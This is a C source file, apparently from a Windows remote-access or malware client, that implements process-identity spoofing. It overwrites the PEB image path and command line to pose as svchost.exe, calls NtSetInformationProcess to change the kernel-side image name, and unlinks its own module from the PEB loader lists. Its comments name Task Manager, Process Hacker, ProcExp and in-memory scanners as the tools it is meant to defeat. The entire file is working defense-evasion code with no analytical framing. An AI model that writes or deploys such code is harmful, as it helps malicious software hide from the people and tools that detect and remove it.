/*
 * client/spoof.c  –  Process-identity spoofing implementation
 * ============================================================
 * Implements the three routines declared in spoof.h.
 * All functions are silent no-ops on failure.
 */

#include "spoof.h"

#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <windows.h>
#include <winternl.h>
#include <string.h>
#include <stddef.h>

/* Strings written into the PEB */
#define SPOOF_IMAGE   L"C:\\Windows\\System32\\svchost.exe"
#define SPOOF_CMDLINE L"C:\\Windows\\System32\\svchost.exe -k netsvcs -p -s Schedule"


/* ── spoof_peb ───────────────────────────────────────────────────────────── */
/*
 * Overwrites PEB ProcessParameters.ImagePathName and .CommandLine so tools
 * that read those fields (Task Manager command-line column, Process Hacker
 * Properties > Image, Sysinternals ProcExp) see a benign svchost.exe path.
 */
void spoof_peb(void)
{
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif

    RTL_USER_PROCESS_PARAMETERS *pp = peb->ProcessParameters;

    static WCHAR sImage[]   = SPOOF_IMAGE;
    static WCHAR sCmdline[] = SPOOF_CMDLINE;

    pp->ImagePathName.Buffer        = sImage;
    pp->ImagePathName.Length        = (USHORT)(wcslen(sImage) * sizeof(WCHAR));
    pp->ImagePathName.MaximumLength = pp->ImagePathName.Length + sizeof(WCHAR);

    pp->CommandLine.Buffer        = sCmdline;
    pp->CommandLine.Length        = (USHORT)(wcslen(sCmdline) * sizeof(WCHAR));
    pp->CommandLine.MaximumLength = pp->CommandLine.Length + sizeof(WCHAR);
}


/* ── spoof_kernel_image ──────────────────────────────────────────────────── */
/*
 * Calls NtSetInformationProcess with information class 49
 * (ProcessImageFileName / ProcessImageFileNameWin32) to replace the
 * kernel-side image-name string.  This is the value that Process Hacker
 * reads for its "Image" column via NtQueryInformationProcess.
 *
 * Works on Vista+, user-mode only.  Silently returns on failure.
 */
void spoof_kernel_image(void)
{
    typedef NTSTATUS (NTAPI *NtSetInfoProcess_t)(HANDLE, ULONG, PVOID, ULONG);

    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return;

    NtSetInfoProcess_t pNtSIP = (NtSetInfoProcess_t)
        GetProcAddress(hNtdll, "NtSetInformationProcess");
    if (!pNtSIP) return;

    static WCHAR wPath[] = SPOOF_IMAGE;  /* writable; kernel may NUL-terminate */
    UNICODE_STRING us;
    us.Length        = (USHORT)(wcslen(wPath) * sizeof(WCHAR));
    us.MaximumLength = us.Length + sizeof(WCHAR);
    us.Buffer        = wPath;

    /* class 49 = ProcessImageFileName */
    pNtSIP(GetCurrentProcess(), 49, &us, (ULONG)sizeof(us));
}


/* ── unlink_self_from_ldr ────────────────────────────────────────────────── */
/*
 * Remove the current module from the three PEB LDR doubly-linked lists so
 * tools that walk those lists (Process Hacker "Modules" tab, LDR-based
 * in-memory scanners) cannot see us.
 *
 * Design
 * ------
 * The LDR entry for our process image sits in three doubly-linked lists:
 *   InLoadOrderModuleList       – walking order = load order
 *   InMemoryOrderModuleList     – walking order = VA order
 *   InInitializationOrderModuleList – walk order = init order
 *                                    (EXEs have no entry here on Win8+)
 *
 * Unlinking a node from a doubly-linked list:
 *   prev->Flink = node->Flink;
 *   next->Blink = node->Blink;
 * Then poison the node's own pointers to prevent double-unlink crashes:
 *   node->Flink = node->Blink = node;   (self-loop)
 *
 * Version safety
 * --------------
 * The InInitializationOrderLinks field is absent for EXE entries on
 * Windows 8+ (it is only populated for DLLs).  Attempting to unlink
 * a zeroed / corrupt entry causes an access violation.
 *
 * Strategy:
 *  1. Query the Windows build number via RtlGetVersion.
 *  2. On build < 9200 (pre-Win8) unlink all three lists.
 *  3. On build >= 9200 unlink only InLoadOrder and InMemoryOrder.
 *  4. Verify each Flink/Blink is non-NULL before touching it.
 *
 * This function is a silent no-op on any failure.
 */

/* Internal: unlink a LIST_ENTRY node and self-loop its pointers */
static void _ldr_unlink(LIST_ENTRY *node)
{
    LIST_ENTRY *prev = node->Blink;
    LIST_ENTRY *next = node->Flink;
    if (!prev || !next || prev == node || next == node) return;

    prev->Flink = next;
    next->Blink = prev;

    /* Poison: self-loop so a second pass through a stale pointer is harmless */
    node->Flink = node;
    node->Blink = node;
}

/*
 * Full in-process LDR_DATA_TABLE_ENTRY layout.
 * winternl.h only exposes a truncated version; define what we need.
 */
typedef struct _MY_LDR_ENTRY {
    LIST_ENTRY InLoadOrderLinks;
    LIST_ENTRY InMemoryOrderLinks;
    LIST_ENTRY InInitializationOrderLinks;
    PVOID      DllBase;
    /* remaining fields not accessed */
} MY_LDR_ENTRY;

/*
 * Full PEB_LDR_DATA layout — winternl.h's public definition only declares
 * InMemoryOrderModuleList; the real struct has InLoadOrderModuleList first.
 */
typedef struct _MY_PEB_LDR_DATA {
    ULONG     Length;
    BOOLEAN   Initialized;
    PVOID     SsHandle;
    LIST_ENTRY InLoadOrderModuleList;
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} MY_PEB_LDR_DATA;

void unlink_self_from_ldr(void)
{
    /* ── 1. Get Windows build number via RtlGetVersion ───────────────── */
    DWORD buildNumber = 0;
    {
        typedef NTSTATUS (NTAPI *RtlGetVersion_t)(PRTL_OSVERSIONINFOW);
        HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
        if (hNtdll) {
            RtlGetVersion_t pRtlGetVersion =
                (RtlGetVersion_t)GetProcAddress(hNtdll, "RtlGetVersion");
            if (pRtlGetVersion) {
                RTL_OSVERSIONINFOW ovi = {0};
                ovi.dwOSVersionInfoSize = sizeof(ovi);
                if (NT_SUCCESS(pRtlGetVersion(&ovi)))
                    buildNumber = ovi.dwBuildNumber;
            }
        }
    }
    /* Fallback: if we could not get the build, be conservative and skip Init list */
    BOOL unlink_init = (buildNumber > 0 && buildNumber < 9200);

    /* ── 2. Locate our own LDR entry via PEB ─────────────────────────── */
#ifdef _WIN64
    PEB *peb = (PEB *)__readgsqword(0x60);
#else
    PEB *peb = (PEB *)__readfsdword(0x30);
#endif
    if (!peb || !peb->Ldr) return;

    /* Cast to our full layout — the public PEB_LDR_DATA in winternl.h
     * does not expose InLoadOrderModuleList in all MinGW header versions */
    MY_PEB_LDR_DATA *ldr = (MY_PEB_LDR_DATA *)peb->Ldr;

    /* The first non-header entry in InLoadOrderModuleList is our EXE.
     * Flink of the head sentinel is the first real entry.             */
    LIST_ENTRY *loadHead = &ldr->InLoadOrderModuleList;
    if (!loadHead->Flink || loadHead->Flink == loadHead) return;

    /* Recover the MY_LDR_ENTRY that owns this InLoadOrderLinks node */
    MY_LDR_ENTRY *entry = (MY_LDR_ENTRY *)loadHead->Flink;

    /* Sanity: DllBase should match our own image base */
    HMODULE hSelf = GetModuleHandleA(NULL);
    if (entry->DllBase != (PVOID)hSelf) return;   /* unexpected layout */

    /* ── 3. Unlink from InLoadOrderModuleList ────────────────────────── */
    _ldr_unlink(&entry->InLoadOrderLinks);

    /* ── 4. Unlink from InMemoryOrderModuleList ──────────────────────── */
    _ldr_unlink(&entry->InMemoryOrderLinks);

    /* ── 5. Unlink from InInitializationOrderModuleList (pre-Win8 only) */
    if (unlink_init)
        _ldr_unlink(&entry->InInitializationOrderLinks);
}
